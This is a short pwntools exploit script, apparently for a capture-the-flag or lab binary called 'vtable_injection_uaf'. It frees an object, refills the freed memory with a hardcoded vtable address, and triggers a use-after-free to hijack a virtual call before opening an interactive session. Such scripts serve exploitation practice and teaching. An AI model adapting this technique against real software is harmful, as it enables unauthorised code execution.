#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
r = process('./vtable_injection_uaf')


def usenote():
    r.recvuntil("4. exit\n")
    r.sendline("1")

def afternote(_len,_data):
    r.recvuntil("4. exit\n")
    r.sendline("2")
    r.recvuntil("size is:\n")
    r.sendline(_len)
    r.recvuntil("data is:\n")
    r.sendline(_data)

def freenote():
    r.recvuntil("4. exit\n")
    r.sendline("3")

# plz set the vul vtable addr
vtable_add =0x4040d8

freenote()
#raw_input()
afternote("48",p64(vtable_add))
afternote("48",p64(vtable_add))
usenote()

r.interactive()
